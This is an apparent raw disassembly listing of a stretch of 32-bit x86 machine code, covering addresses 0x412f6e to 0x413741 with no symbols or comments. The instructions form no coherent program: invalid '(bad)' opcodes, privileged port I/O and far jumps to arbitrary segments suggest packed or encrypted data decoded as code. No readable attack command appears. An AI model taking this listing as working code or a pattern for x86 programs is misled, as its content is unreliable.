  412f6e:	add    al,BYTE PTR ds:0x42f8881b
  412f74:	mov    al,ds:0xa1d48c77
  412f79:	out    0x24,al
  412f7b:	cs loopne 0x412f70
  412f7e:	mov    ecx,DWORD PTR [esi]
  412f80:	or     al,0x28
  412f82:	not    DWORD PTR [esi]
  412f84:	add    al,0xd7
  412f86:	out    dx,al
  412f87:	dec    ecx
  412f88:	adc    eax,0x33e0e6e7
  412f8d:	shl    DWORD PTR [ecx],1
  412f8f:	in     al,dx
  412f90:	or     BYTE PTR [eax+eiz*4],dh
  412f93:	setnp  ch
  412f96:	dec    edx
  412f97:	pop    ecx
  412f98:	ds std 
  412f9a:	pushf  
  412f9b:	aas    
  412f9c:	(bad)  
  412f9d:	(bad)  [eax]
  412f9f:	int3   
  412fa0:	das    
  412fa1:	xchg   ecx,eax
  412fa2:	mov    edi,0xd335af46
  412fa7:	mov    eax,0xa9bd5048
  412fac:	cmc    
  412fad:	(bad)  
  412fae:	jle    0x412f43
  412fb0:	call   0xa8b7326e
  412fb5:	stos   DWORD PTR es:[edi],eax
  412fb6:	inc    ecx
  412fb7:	stc    
  412fb8:	daa    
  412fb9:	ret    
  412fba:	shl    BYTE PTR [ebx-0x7a793c0f],0xae
  412fc1:	je     0x412f65
  412fc3:	cmp    ah,ah
  412fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc6:	jne    0x412f78
  412fc8:	sbb    eax,0x92195e66
  412fcd:	jo     0x412f5f
  412fcf:	(bad)  
  412fd0:	stos   BYTE PTR es:[edi],al
  412fd1:	sbb    DWORD PTR [esi],ebp
  412fd3:	imul   esp,DWORD PTR [ebx-0x5f4b58e9],0x964add23
  412fdd:	dec    esp
  412fde:	adc    DWORD PTR [edi-0x30cd271a],0x35c7e112
  412fe8:	mov    ch,0xf
  412fea:	or     DWORD PTR [ebx+ebx*1],ebx
  412fed:	shl    BYTE PTR [edx+0x29],cl
  412ff0:	push   ebp
  412ff1:	dec    edx
  412ff2:	pop    esp
  412ff3:	xchg   esi,eax
  412ff4:	pop    esp
  412ff5:	es jne 0x412fc8
  412ff8:	hlt    
  412ff9:	or     eax,0xcaa868a3
  412ffe:	outs   dx,DWORD PTR ds:[esi]
  412fff:	mov    ebp,0xeb291063
  413004:	push   esp
  413005:	mov    ecx,0x8abe1456
  41300a:	mov    BYTE PTR [ecx-0x6daee6a5],al
  413010:	sub    DWORD PTR [bp+0x7a],0x15181fd8
  413018:	retf   
  413019:	scas   eax,DWORD PTR es:[edi]
  41301a:	fsubr  DWORD PTR [ebx-0x5b]
  41301d:	xchg   ebx,eax
  41301e:	leave  
  41301f:	cmc    
  413020:	cmp    ebx,esp
  413022:	es ins DWORD PTR es:[edi],dx
  413024:	clc    
  413025:	out    0xef,eax
  413027:	cmp    ah,0x14
  41302a:	add    al,0xac
  41302c:	(bad)  
  41302d:	dec    DWORD PTR [esi-0x57]
  413030:	cmc    
  413031:	dec    esi
  413032:	cli    
  413033:	imul   BYTE PTR [edi]
  413035:	cmp    al,0x45
  413037:	sbb    DWORD PTR [esi],eax
  413039:	mov    al,0x1a
  41303b:	push   esi
  41303c:	and    eax,0x90530ce9
  413041:	mov    DWORD PTR gs:[edi-0x68],ebp
  413045:	dec    esp
  413046:	pop    ds
  413047:	bound  esi,QWORD PTR [eax+0x3f44102c]
  41304d:	je     0x41306d
  41304f:	inc    eax
  413050:	repnz push 0x66
  413053:	and    eax,0x6148a368
  413058:	aas    
  413059:	cmp    ebp,ecx
  41305b:	adc    eax,0x88519a9c
  413060:	lea    ebx,[esi-0x5e]
  413063:	fwait
  413064:	cmp    ebp,DWORD PTR [ebp+0x63]
  413067:	mov    edi,0xe8d827b4
  41306c:	inc    esp
  41306d:	sub    BYTE PTR [ecx-0x57],al
  413070:	popf   
  413071:	fwait
  413072:	cmp    al,0x7
  413074:	adc    ebp,DWORD PTR [ebx+ebx*1-0x44]
  413078:	int3   
  413079:	mov    eax,0x4110c241
  41307e:	inc    edx
  41307f:	sub    dl,BYTE PTR [edi+0x7cc1c28d]
  413085:	xchg   ebx,eax
  413086:	and    edi,DWORD PTR [ebx-0x353b386e]
  41308c:	out    0x59,eax
  41308e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41308f:	in     al,dx
  413090:	outs   dx,BYTE PTR ds:[esi]
  413091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413092:	dec    ebx
  413093:	fidivr DWORD PTR [edi]
  413095:	bound  ecx,QWORD PTR [edx+0x48]
  413098:	add    eax,0x48616013
  41309d:	xchg   esp,eax
  41309e:	mov    DWORD PTR [ebx-0x1f4723a0],esp
  4130a4:	add    eax,0x7e69ff38
  4130a9:	mov    ah,0x18
  4130ab:	out    dx,eax
  4130ac:	adc    ebx,DWORD PTR [esi+eiz*8-0x3a]
  4130b0:	mul    DWORD PTR [ebx]
  4130b2:	es (bad) 
  4130b4:	inc    eax
  4130b5:	cmp    eax,0xc362c81a
  4130ba:	mov    eax,0xd1f86c69
  4130bf:	push   ebx
  4130c0:	mov    ds:0x5c70a8ef,al
  4130c5:	push   ecx
  4130c6:	popf   
  4130c7:	mov    ah,0xe2
  4130c9:	cs jnp 0x413105
  4130cc:	and    bl,bl
  4130ce:	sbb    DWORD PTR [eax-0x6e],esp
  4130d1:	repz sbb al,0xb8
  4130d4:	iret   
  4130d5:	lea    ebp,[ebx]
  4130d7:	arpl   WORD PTR [ebp-0x77],bx
  4130da:	cld    
  4130db:	jno    0x41315c
  4130dd:	test   BYTE PTR [edx+0x67],0x17
  4130e1:	push   edx
  4130e2:	jb     0x413078
  4130e4:	jg     0x41309e
  4130e6:	(bad)  
  4130e8:	pop    edx
  4130e9:	cmc    
  4130ea:	popa   
  4130eb:	jp     0x41312c
  4130ed:	xor    al,0x5d
  4130ef:	sub    eax,eax
  4130f1:	iret   
  4130f2:	sti    
  4130f3:	sub    DWORD PTR [eax],ebx
  4130f5:	xchg   ebp,eax
  4130f6:	dec    ebx
  4130f7:	push   cs
  4130f8:	mov    ebp,0x77ee1b16
  4130fd:	imul   edi,DWORD PTR [ecx-0xa4cf4af],0x53791ffc
  413107:	push   0xbf28d551
  41310c:	ss out dx,al
  41310e:	adc    ch,cl
  413110:	call   0x3e10:0xa892bcaa
  413117:	sbb    esp,DWORD PTR [ecx+0x7ad654f3]
  41311d:	xor    eax,0x9ea53907
  413122:	call   0xea2574b4
  413127:	test   al,0x41
  413129:	hlt    
  41312a:	dec    edx
  41312b:	sub    BYTE PTR [edx+ebx*4+0x1b2508b9],dh
  413132:	jns    0x4131ad
  413134:	jno    0x4130d0
  413136:	dec    eax
  413137:	mov    edi,0xf0f7f870
  41313c:	lahf   
  41313d:	mov    esi,0x43841751
  413142:	push   0xfffffffb
  413144:	shl    BYTE PTR [eax+0x62d81b40],0xd8
  41314b:	leave  
  41314c:	pop    es
  41314d:	xor    eax,0x1aa4802b
  413152:	imul   ebp,DWORD PTR [ebx],0xfcb0b72b
  413158:	adc    DWORD PTR [ebp+0x35],esi
  41315b:	fstp   st(1)
  41315d:	pop    edx
  41315e:	jbe    0x413154
  413160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413161:	leave  
  413162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413163:	mov    ebx,0x606c55d8
  413168:	retf   
  413169:	jne    0x413196
  41316b:	adc    DWORD PTR [eax+0x21b8aed0],ebx
  413171:	inc    ebp
  413172:	scas   eax,DWORD PTR es:[edi]
  413173:	push   eax
  413174:	div    BYTE PTR ds:0xf76912e0
  41317a:	pop    ds
  41317b:	ret    0xb87a
  41317e:	test   BYTE PTR [ebx-0x6a],0xe5
  413182:	mov    ch,BYTE PTR [eax+0x1a600643]
  413188:	ss iret 
  41318a:	aad    0x82
  41318c:	push   0xffffffad
  41318e:	push   0x11
  413190:	jp     0x41312b
  413192:	(bad)  
  413193:	in     al,dx
  413194:	xor    eax,0x83d6ed27
  413199:	dec    edi
  41319a:	out    0x5f,al
  41319c:	xchg   edi,eax
  41319d:	xchg   esi,eax
  41319e:	lea    ebx,[edx+0x7]
  4131a1:	push   esp
  4131a2:	hlt    
  4131a3:	push   ebp
  4131a4:	pop    esp
  4131a5:	(bad)  
  4131a6:	lahf   
  4131a7:	(bad)  
  4131a8:	(bad)
  4131ad:	sahf   
  4131ae:	mov    cl,0xb4
  4131b0:	and    eax,0x646a6442
  4131b5:	sti    
  4131b6:	inc    edi
  4131b7:	inc    edi
  4131b8:	sub    BYTE PTR ds:0xeaf18364,0xed
  4131bf:	jmp    0x833957f3
  4131c4:	pop    ebp
  4131c5:	cdq    
  4131c6:	mov    DWORD PTR [eax-0x70],edx
  4131c9:	cmp    dh,BYTE PTR [eax]
  4131cb:	arpl   WORD PTR [eax+0x5b],dx
  4131ce:	add    al,0x5e
  4131d0:	outs   dx,BYTE PTR ds:[esi]
  4131d1:	in     eax,dx
  4131d2:	mov    ebp,0x81c69be1
  4131d7:	jecxz  0x413237
  4131d9:	push   0x5d
  4131db:	pop    eax
  4131dc:	pop    edi
  4131dd:	add    al,0xa
  4131df:	imul   esp,DWORD PTR [ecx],0x70
  4131e2:	test   BYTE PTR [edi],ch
  4131e4:	outs   dx,DWORD PTR ds:[esi]
  4131e5:	(bad)  [edi-0x2d212fce]
  4131eb:	fcompp 
  4131ed:	or     eax,0x5b2282b8
  4131f2:	sti    
  4131f3:	dec    esp
  4131f4:	call   0x254f3be
  4131f9:	(bad)  
  4131fa:	xlat   BYTE PTR ds:[ebx]
  4131fb:	mov    esp,0xeed1c496
  413200:	popf   
  413201:	push   ecx
  413202:	mov    ch,BYTE PTR [ebx+0x2c84e27]
  413208:	pop    ecx
  413209:	mov    BYTE PTR [edx],bh
  41320b:	sub    ebx,edx
  41320d:	adc    BYTE PTR [esi-0x16],0x40
  413211:	scas   eax,DWORD PTR es:[edi]
  413212:	in     al,0x1
  413214:	push   cs
  413215:	mov    dh,0x2d
  413217:	and    BYTE PTR [ecx-0x39954f1c],bh
  41321d:	xchg   ebp,eax
  41321e:	mov    eax,0xb603167e
  413223:	daa    
  413224:	cmp    ecx,edi
  413226:	mov    ds:0xb3802771,al
  41322b:	mov    eax,ds:0x1940e6e
  413230:	adc    BYTE PTR [ecx-0x6e],bl
  413233:	iret   
  413234:	add    ebx,DWORD PTR [ecx+0x7d]
  413237:	(bad)  
  413238:	in     al,0xfb
  41323a:	repz gs adc eax,edx
  41323e:	mov    BYTE PTR [edx-0x2eb47787],ch
  413244:	sub    eax,0x2121aca6
  413249:	push   edx
  41324a:	push   ss
  41324b:	in     eax,dx
  41324c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41324d:	mov    al,ds:0x3514121a
  413252:	outs   dx,BYTE PTR ds:[esi]
  413253:	in     al,0xfc
  413255:	fisttp WORD PTR [ebp-0x5]
  413258:	mov    ecx,0x6ce46538
  41325d:	dec    edi
  41325e:	sbb    dh,cl
  413260:	adc    eax,0xaf5b247a
  413265:	mov    ah,0x3a
  413267:	xchg   esi,eax
  413268:	sbb    ch,BYTE PTR [eax+0x44e589c]
  41326e:	test   DWORD PTR [ebx+esi*8+0x6a980e6b],ebx
  413275:	inc    edx
  413276:	or     eax,0xf620728d
  41327b:	stos   DWORD PTR es:[edi],eax
  41327c:	loope  0x413274
  41327e:	pop    ds
  41327f:	xor    al,0xe8
  413281:	cmp    al,0x8c
  413283:	inc    ebx
  413284:	xchg   ecx,eax
  413285:	repz pop esi
  413287:	sbb    eax,0xcb8165e9
  41328c:	mov    BYTE PTR [ebx],al
  41328e:	mov    ch,0xdd
  413290:	cmp    ecx,DWORD PTR [edi]
  413292:	popf   
  413293:	mov    ecx,0x863e08c3
  413298:	in     al,dx
  413299:	ins    DWORD PTR es:[edi],dx
  41329a:	pop    ebx
  41329b:	mov    ebx,0xdeff2a2e
  4132a0:	sbb    edi,DWORD PTR [ebx-0x7e86ceb5]
  4132a6:	jecxz  0x41322f
  4132a8:	xor    BYTE PTR [eax-0x22],0x59
  4132ac:	mov    esp,fs
  4132ae:	ss mov cl,0xde
  4132b1:	data16 aad 0x40
  4132b4:	and    ah,BYTE PTR [edx+0x4d]
  4132b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132b8:	(bad)  
  4132b9:	cmp    eax,0xe38b9a08
  4132be:	lods   al,BYTE PTR ds:[esi]
  4132bf:	push   ecx
  4132c0:	jno    0x413341
  4132c2:	push   ss
  4132c3:	xchg   edi,eax
  4132c4:	mov    ch,0x1d
  4132c6:	sub    DWORD PTR [ebx],0x18
  4132c9:	(bad)  
  4132ca:	fld    DWORD PTR [eax]
  4132cc:	cwde   
  4132cd:	pop    edi
  4132ce:	js     0x41333f
  4132d0:	cmp    bl,BYTE PTR [edx]
  4132d2:	push   edx
  4132d3:	js     0x41328c
  4132d5:	xchg   edx,eax
  4132d6:	aam    0x95
  4132d8:	add    eax,0x9d54d780
  4132dd:	jg     0x41333a
  4132df:	jae    0x413299
  4132e1:	outs   dx,DWORD PTR ds:[esi]
  4132e2:	daa    
  4132e3:	jno    0x4132d4
  4132e5:	cs sub al,0x74
  4132e8:	sbb    al,0x54
  4132ea:	loopne 0x41328a
  4132ec:	jae    0x41335a
  4132ee:	test   esp,eax
  4132f0:	retf   0x4548
  4132f3:	cmp    BYTE PTR ds:0x8b69e821,bh
  4132f9:	mov    eax,0xb8b8aa89
  4132fe:	scas   eax,DWORD PTR es:[edi]
  4132ff:	rcr    BYTE PTR [edi+0x24c9c898],0x3
  413306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413307:	pusha  
  413308:	test   BYTE PTR [ebp+0x21],bh
  41330b:	cmc    
  41330c:	mov    ebx,DWORD PTR [ebx]
  41330e:	popa   
  41330f:	in     eax,0x2b
  413311:	jmp    0xf03b:0x3194cfcb
  413318:	mov    eax,ds:0x32ef995e
  41331d:	pop    edi
  41331e:	xor    al,0xb7
  413320:	xor    ax,0x8793
  413324:	std    
  413325:	pushf  
  413326:	int3   
  413327:	dec    ebx
  413328:	lahf   
  413329:	in     eax,dx
  41332a:	push   ebp
  41332b:	jo     0x4132f9
  41332d:	rcr    al,0x75
  413330:	in     al,0x61
  413332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413333:	fst    DWORD PTR [ebp+0x4b78f047]
  413339:	test   DWORD PTR [edx+0x41],edi
  41333c:	mov    ds:0x2324b5f1,al
  413341:	outs   dx,DWORD PTR ds:[esi]
  413342:	rep stos BYTE PTR es:[edi],al
  413344:	repz add esp,DWORD PTR ds:0x6b6ebad9
  41334b:	popa   
  41334c:	mov    dl,0xdc
  41334e:	(bad)  
  41334f:	jno    0x41337b
  413351:	sahf   
  413352:	test   eax,0xaeff8413
  413357:	enter  0x6e42,0x33
  41335b:	pop    ecx
  41335c:	push   ecx
  41335d:	inc    edx
  41335e:	xchg   esp,eax
  41335f:	push   0xffffffcc
  413361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413363:	aaa    
  413364:	adc    al,0xcc
  413366:	je     0x4133bd
  413368:	mov    edx,0x48a5cf63
  41336d:	ins    DWORD PTR es:[edi],dx
  41336e:	adc    al,BYTE PTR [eiz*1+0x28afa76e]
  413375:	scas   eax,DWORD PTR es:[edi]
  413376:	xor    al,0xc0
  413378:	in     al,dx
  413379:	cmp    DWORD PTR [eax-0x3bd1c040],eax
  41337f:	dec    edi
  413380:	(bad)  
  413381:	jno    0x41339d
  413383:	jmp    0x438b:0x4a075059
  41338a:	dec    ecx
  41338b:	sbb    ebp,DWORD PTR [esi+edx*1+0x1f]
  41338f:	ror    cl,cl
  413391:	cs and eax,0x19dfd4e8
  413397:	xchg   esp,eax
  413398:	(bad)  
  413399:	in     eax,dx
  41339a:	xlat   BYTE PTR ds:[ebx]
  41339b:	sub    cl,bh
  41339d:	std    
  41339e:	push   cs
  41339f:	retf   0xadf5
  4133a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133a3:	mov    al,0x5c
  4133a5:	jb     0x413404
  4133a7:	dec    edi
  4133a8:	popa   
  4133a9:	cmp    BYTE PTR [ecx+0x58f26ac7],0x48
  4133b0:	xor    BYTE PTR ds:0x6bd6fdb,ch
  4133b6:	jns    0x4133f2
  4133b8:	nop
  4133b9:	push   eax
  4133ba:	cwde   
  4133bb:	sti    
  4133bc:	rcr    BYTE PTR [esi+eax*4+0xda956b0],1
  4133c3:	imul   esp,DWORD PTR [edi],0x82d80a90
  4133c9:	ss in  al,0xbb
  4133cc:	push   0x23b28216
  4133d1:	push   ecx
  4133d2:	cli    
  4133d3:	jmp    0x446c:0x7e1eeb12
  4133da:	lods   eax,DWORD PTR ds:[esi]
  4133db:	into   
  4133dc:	adc    ecx,edx
  4133de:	es jecxz 0x4133d7
  4133e1:	sbb    al,0x86
  4133e3:	(bad)  
  4133e4:	out    dx,al
  4133e5:	mov    DWORD PTR [ebx+ebx*4-0x2d5409e9],esi
  4133ec:	jb     0x4133da
  4133ee:	cdq    
  4133ef:	test   al,0x2f
  4133f1:	sub    BYTE PTR [eax+0x33],cl
  4133f4:	jmp    0x9c02:0x3c4b1d56
  4133fb:	or     al,0xa8
  4133fd:	pop    ebx
  4133fe:	xor    eax,0x8efb575a
  413403:	into   
  413404:	mov    ah,0x6e
  413406:	dec    edi
  413407:	xor    eax,0x1aca528b
  41340c:	sti    
  41340d:	(bad)  
  41340e:	outs   dx,DWORD PTR ds:[esi]
  41340f:	sbb    DWORD PTR [ebx+ebx*4],esi
  413412:	mov    ds:0x58927d8d,al
  413417:	push   eax
  413418:	popf   
  413419:	jbe    0x4133b1
  41341b:	cmp    al,0x1f
  41341d:	in     eax,dx
  41341e:	xchg   ebx,ebp
  413420:	adc    DWORD PTR [eax+0x60],esi
  413423:	idiv   DWORD PTR [edi-0x47]
  413426:	push   ss
  413427:	addr16 add ah,al
  41342a:	or     cl,BYTE PTR [edi+0x26388d1a]
  413430:	icebp  
  413431:	lods   eax,DWORD PTR ds:[esi]
  413432:	mov    ch,0x28
  413434:	nop
  413435:	popf   
  413436:	loope  0x413499
  413438:	ret    
  413439:	inc    edx
  41343a:	push   edx
  41343b:	cdq    
  41343c:	xor    eax,0xfd5ccee
  413441:	out    dx,al
  413442:	xchg   edi,eax
  413443:	jge    0x413454
  413445:	nop
  413446:	push   es
  413447:	imul   esp,ebx,0xffffffde
  41344a:	mov    ebp,0x4d3086fe
  41344f:	jge    0x41343a
  413451:	cmc    
  413452:	jo     0x41346f
  413454:	aas    
  413455:	add    al,0xc4
  413457:	jl     0x413432
  413459:	mov    cl,0x52
  41345b:	lds    ebp,FWORD PTR [esi+edi*2+0x19]
  41345f:	(bad)  
  413460:	into   
  413461:	sti    
  413462:	dec    edi
  413463:	or     DWORD PTR [edi+0x1aee622f],0x3b43b06c
  41346d:	fcmovnu st,st(3)
  41346f:	pop    esp
  413470:	and    DWORD PTR [eax+0x61],esp
  413473:	xor    BYTE PTR [esi+edx*2],al
  413476:	mov    ah,0x18
  413478:	xchg   ebp,eax
  413479:	pop    ds
  41347a:	daa    
  41347b:	jp     0x4134be
  41347d:	(bad)  
  41347e:	inc    ecx
  413480:	ret    
  413481:	push   esp
  413482:	inc    ebx
  413483:	xchg   esi,eax
  413484:	(bad)  
  413485:	dec    edi
  413486:	js     0x4134c8
  413488:	add    ah,dl
  41348a:	inc    ecx
  41348b:	and    eax,0x177fda88
  413490:	mov    ah,0x61
  413492:	dec    ecx
  413493:	push   esi
  413494:	out    dx,eax
  413495:	daa    
  413496:	pusha  
  413497:	sbb    ebp,0xffffffe6
  41349a:	push   0xa234fd89
  41349f:	xchg   esi,eax
  4134a0:	jl     0x4134cd
  4134a2:	or     eax,0x3c242e52
  4134a7:	call   0x67c77f95
  4134ac:	lahf   
  4134ad:	icebp  
  4134ae:	cmp    eax,0x3d2d6cc0
  4134b3:	mov    ah,0x4c
  4134b5:	pop    esp
  4134b6:	sbb    edi,eax
  4134b8:	rcr    DWORD PTR [ecx-0x7e],cl
  4134bb:	mov    esp,0x2235df2
  4134c0:	(bad)  
  4134c1:	xlat   BYTE PTR fs:[ebx]
  4134c3:	das    
  4134c4:	jp     0x413538
  4134c6:	adc    bl,ah
  4134c8:	dec    ecx
  4134c9:	call   FWORD PTR [ebp-0x43b3c372]
  4134cf:	aam    0xcc
  4134d1:	adc    al,0x2b
  4134d3:	and    al,0xa8
  4134d5:	pop    edx
  4134d6:	sbb    BYTE PTR [edi-0xb95b5f7],dl
  4134dc:	xchg   esi,eax
  4134dd:	xchg   esi,eax
  4134de:	ins    BYTE PTR es:[edi],dx
  4134df:	dec    eax
  4134e0:	jge    0x4134c4
  4134e2:	jnp    0x4134c8
  4134e4:	mov    ecx,0x2ca415ed
  4134e9:	enter  0x2463,0xc5
  4134ed:	outs   dx,BYTE PTR ds:[esi]
  4134ee:	pop    esp
  4134ef:	adc    BYTE PTR [edi+0x5],bh
  4134f2:	xchg   ecx,eax
  4134f3:	mov    ch,BYTE PTR [eax+0x498040fb]
  4134f9:	pop    esi
  4134fa:	and    DWORD PTR [eax+0xf06d3e7],edx
  413500:	cdq    
  413501:	xchg   edi,eax
  413502:	imul   esi,DWORD PTR [edi-0x63],0xffffffd4
  413506:	xchg   esp,eax
  413507:	or     eax,0x6274c77e
  41350c:	lods   eax,DWORD PTR ds:[esi]
  41350d:	inc    ebp
  41350e:	sub    eax,0xa1b1e8a6
  413513:	mov    ds:0x4f45202b,eax
  413518:	leave  
  413519:	or     eax,0x8fe5704d
  41351e:	nop
  41351f:	cli    
  413520:	or     DWORD PTR [ecx-0x27],ecx
  413523:	call   0x31d1:0xabcbf6b4
  41352a:	rcr    DWORD PTR [ebx+0x41],1
  41352d:	mov    WORD PTR [esp+eax*4+0x51e64430],gs
  413534:	mov    ecx,0x2ae6d679
  413539:	outs   dx,DWORD PTR ds:[esi]
  41353a:	into   
  41353b:	add    eax,DWORD PTR [edx]
  41353d:	sub    eax,0xc460ea3c
  413542:	mov    ds:0x321f2aca,al
  413547:	mov    WORD PTR [edi+0x6c],es
  41354a:	test   eax,0x204a8f5
  41354f:	jo     0x413557
  413551:	jl     0x4134e4
  413553:	ret    0x9070
  413556:	or     bl,al
  413558:	mov    al,ds:0x813a1329
  41355d:	sub    BYTE PTR [eax],cl
  41355f:	fwait
  413560:	enter  0x46e4,0x56
  413564:	dec    eax
  413565:	mov    cl,bl
  413567:	jae    0x413549
  413569:	fxtract 
  41356b:	push   ss
  41356c:	pop    ecx
  41356d:	pop    ecx
  41356e:	xrelease xchg BYTE PTR [ebp+0x7484e9e5],dh
  413575:	call   ebx
  413577:	data16 lods al,BYTE PTR ds:[esi]
  413579:	hlt    
  41357a:	adc    BYTE PTR [ebx-0x41],cl
  41357d:	dec    ebx
  41357e:	sbb    al,0xf8
  413580:	stos   BYTE PTR es:[edi],al
  413581:	push   ebp
  413582:	dec    ebx
  413583:	push   DWORD PTR [esi-0x4a]
  413586:	imul   esi,ebp,0xffffff9b
  413589:	mov    edi,0x5720f0ba
  41358e:	ret    
  41358f:	out    0x9b,eax
  413591:	lock ret 0x8686
  413595:	imul   edi,esi,0x9be69dbc
  41359b:	mov    es,ecx
  41359d:	push   0xfddf3811
  4135a2:	push   eax
  4135a3:	jmp    0x25b24b2e
  4135a8:	jl     0x413590
  4135aa:	iret   
  4135ab:	nop
  4135ac:	es add eax,0xfefc6dd5
  4135b2:	mov    al,ds:0xf8cf3d71
  4135b7:	pushf  
  4135b8:	lock jecxz 0x4135cf
  4135bb:	and    al,ah
  4135bd:	mov    al,ds:0x9341fc86
  4135c2:	std    
  4135c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135c4:	lods   eax,DWORD PTR ds:[esi]
  4135c5:	mov    ebp,cr0
  4135c8:	(bad)  
  4135c9:	mov    ds:0x993fa0fb,al
  4135ce:	fs sub edx,edx
  4135d1:	out    dx,al
  4135d2:	push   0x6217dd87
  4135d7:	mov    eax,0x1249aa4d
  4135dc:	and    eax,0xb0d2d3fa
  4135e1:	ret    0x63a5
  4135e4:	aas    
  4135e5:	adc    dl,bh
  4135e7:	dec    edi
  4135e8:	push   esp
  4135e9:	jb     0x4135c2
  4135eb:	into   
  4135ec:	loopne 0x4135f0
  4135ee:	mov    ebx,0x2011f7e5
  4135f3:	jns    0x413655
  4135f5:	xor    eax,0xe9312ef3
  4135fa:	rcl    esp,cl
  4135fc:	iret   
  4135fd:	lahf   
  4135fe:	and    bh,BYTE PTR [edx-0x221b7a96]
  413604:	lock push edx
  413606:	sar    DWORD PTR [eax-0x15],cl
  413609:	xchg   ebp,eax
  41360a:	add    al,BYTE PTR [ebx+0x3049c59f]
  413610:	cwde   
  413611:	jno    0x413655
  413613:	retf   0xb83c
  413616:	inc    ebx
  413617:	xchg   ebx,eax
  413618:	call   0x3f242c49
  41361d:	sub    al,0xf1
  41361f:	repnz scas al,BYTE PTR es:[edi]
  413621:	inc    edx
  413622:	out    0x13,al
  413624:	xor    al,BYTE PTR [ecx-0x66]
  413627:	jle    0x413662
  413629:	aaa    
  41362a:	jp     0x41364f
  41362c:	dec    ebx
  41362d:	push   ss
  41362e:	pusha  
  41362f:	cmp    cl,BYTE PTR [bp+di-0x6322]
  413634:	or     esp,edx
  413636:	sbb    eax,0xe25bab0b
  41363b:	in     eax,dx
  41363c:	and    eax,0x447480d2
  413641:	std    
  413642:	arpl   si,bx
  413644:	ins    DWORD PTR es:[edi],dx
  413645:	ret    0xb1e6
  413648:	cld    
  413649:	std    
  41364a:	mov    esi,ebp
  41364c:	xchg   esp,eax
  41364d:	dec    edi
  41364e:	lods   eax,DWORD PTR ds:[esi]
  41364f:	rcl    BYTE PTR [edx],cl
  413651:	mov    ebp,0xaaabe35a
  413656:	and    eax,0x47324e62
  41365b:	xor    esp,DWORD PTR [ebx+0x7ed22e49]
  413661:	scas   eax,DWORD PTR es:[edi]
  413662:	dec    eax
  413663:	inc    ecx
  413664:	cs pusha 
  413666:	push   ds
  413667:	mov    ebx,0x5b6d5788
  41366c:	push   ebp
  41366d:	jnp    0x4136cc
  41366f:	shr    BYTE PTR [ebx+esi*8],1
  413672:	nop
  413673:	mov    dl,0x3c
  413675:	out    dx,eax
  413676:	xchg   DWORD PTR [ebx],esp
  413678:	cmp    al,0xd0
  41367a:	adc    cl,BYTE PTR [ecx-0x26]
  41367d:	sahf   
  41367e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41367f:	inc    ebx
  413680:	jl     0x413699
  413682:	lock enter 0x4e38,0x19
  413687:	bound  ecx,QWORD PTR [esi-0x56]
  41368a:	dec    edi
  41368b:	push   ecx
  41368c:	sbb    eax,0x8b8b5435
  413691:	cmp    al,0x85
  413693:	shl    esp,0xd8
  413696:	ins    DWORD PTR es:[edi],dx
  413697:	jmp    0xa88566f8
  41369c:	sbb    edx,DWORD PTR [ecx]
  41369e:	mov    ds,WORD PTR [esi+0x1b]
  4136a1:	xor    BYTE PTR [edi-0x30],ch
  4136a4:	dec    edx
  4136a5:	iret   
  4136a6:	or     al,0xbc
  4136a8:	xor    al,BYTE PTR [eax-0x2a]
  4136ab:	pop    esi
  4136ac:	sbb    BYTE PTR [eax+0x13],0x7f
  4136b0:	cld    
  4136b1:	stos   BYTE PTR es:[edi],al
  4136b2:	shr    DWORD PTR [edx],1
  4136b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b5:	sbb    DWORD PTR [ebx+0x78],esp
  4136b8:	imul   esi,DWORD PTR gs:[ebx],0x18452ca4
  4136bf:	aam    0x74
  4136c1:	pop    edx
  4136c2:	(bad)  
  4136c4:	mov    al,0xb1
  4136c6:	(bad)  
  4136c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136c8:	dec    eax
  4136c9:	dec    edi
  4136ca:	mov    dl,0x9f
  4136cc:	std    
  4136cd:	adc    DWORD PTR [edx+eiz*2],esi
  4136d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136d1:	xchg   esp,eax
  4136d2:	bound  eax,QWORD PTR [esi]
  4136d4:	sti    
  4136d5:	(bad)  
  4136d7:	int3   
  4136d8:	mov    ecx,0x85d873b8
  4136dd:	ja     0x41366a
  4136df:	mov    eax,0x2dd822c5
  4136e4:	push   ebp
  4136e5:	aad    0xfd
  4136e7:	pop    ss
  4136e8:	in     eax,dx
  4136e9:	dec    edx
  4136ea:	adc    eax,0x1ba62b6
  4136ef:	jmp    0x63af:0x880789d7
  4136f6:	cdq    
  4136f7:	or     DWORD PTR [ebx-0x75387de4],0x6b
  4136fe:	dec    ebp
  4136ff:	int    0x5c
  413701:	fnstenv [ecx+0xb4ee7aa]
  413707:	and    eax,0x8cf4d64c
  41370c:	iret   
  41370d:	jp     0x41370a
  41370f:	shr    BYTE PTR [ecx+0x2a43e27c],cl
  413715:	or     DWORD PTR [edi+ebp*4+0x40],ecx
  413719:	ja     0x4136d6
  41371b:	adc    edi,ecx
  41371d:	ja     0x41370a
  41371f:	fidiv  WORD PTR [ebp-0x4b]
  413722:	pop    esp
  413723:	les    esp,FWORD PTR [eax]
  413725:	push   edi
  413726:	lahf   
  413727:	sbb    eax,0x72698adc
  41372c:	das    
  41372d:	les    ebp,FWORD PTR [ebx-0x26ecf616]
  413733:	je     0x4136c0
  413735:	in     al,dx
  413736:	inc    ecx
  413737:	jge    0x41378b
  413739:	push   ss
  41373a:	push   ebp
  41373b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41373c:	push   ecx
  41373d:	sbb    al,0x1d
  41373f:	xchg   edi,eax
  413740:	inc    edi
  413741:	pop    ebp
